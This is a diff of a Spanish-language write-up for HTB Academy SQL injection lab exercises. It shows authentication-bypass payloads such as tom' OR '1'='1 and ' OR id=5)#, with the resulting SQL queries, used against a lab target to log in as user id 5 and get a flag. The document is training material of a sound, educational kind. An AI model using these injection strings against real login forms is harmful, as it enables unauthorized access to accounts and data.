@@ -130,36 +130,47 @@ Realizo la prueba usando el usuario tom y como clave pongo un **`'`**
 
 Obtengo la sentencia select que usa la aplicacion para realizar la consulta a la base de datos.
 
-![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-11.png)
+La sentencia realiza un SELECT para todos los logins y aplica un condicionante de usuario y clave entre **`''`**. Por lo que si añado **`tom' OR '1' ='1`** la sentencia sera:
+
+```sql
+SELECT * FROM logins WHERE username='tom' OR '1' ='1' AND password = 'password';
+```
 
 ![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-12.png)
 
+Esta sentencia se ejecutara como verdad siempre ya que la evaluacion del OR en la primera parte de la condicion es verdad. 
+
 ![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-13.png)
-
-
 
 ### Using Comments
 
 **Login as the user with the id 5 to get the flag.**
 
-83.136.252.199:51420
+Maquina objetivo: 83.136.252.199:51420
+
+Accedo al servidor y encuentro la aplicacion web.
 
 ![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-14.png)
 
-usando usuario: tom y password: pass
+Si intento un acceso con las credenciales **`tom:pass`** con sigo la sentencia select que se ejecuta en el servidor para comprobar el login.
+
+![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-15.png)
 
 ```sql
 SELECT * FROM logins WHERE (username='tom' AND id > 1) AND password = '1a1dc91c907325c69271ddf0c944bc72';
 ```
 
-![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-15.png)
+Comprobando la sentencia se puede hacer una injeccion con comentarios para evitar que se compruebe la condicion completa. Para ello uso como usuario: `' OR id=5)#`. Creando de esta forma la siguiente sentencia:
 
-usare como usuario: `' OR id=5)--`
+```sql
+SELECT * FROM logins WHERE (username='' OR id=5)#' AND id > 1) AND password = '1a1dc91c907325c69271ddf0c944bc72';
+```
 
 ![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-16.png)
 
-![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-17.png)
+Obtengo la flag al acceder con el id=5
 
+![alt text](../assets/images/HTB_Academy_SQLi_Fundamentals/image-17.png)
 
 ### Union Clause
 
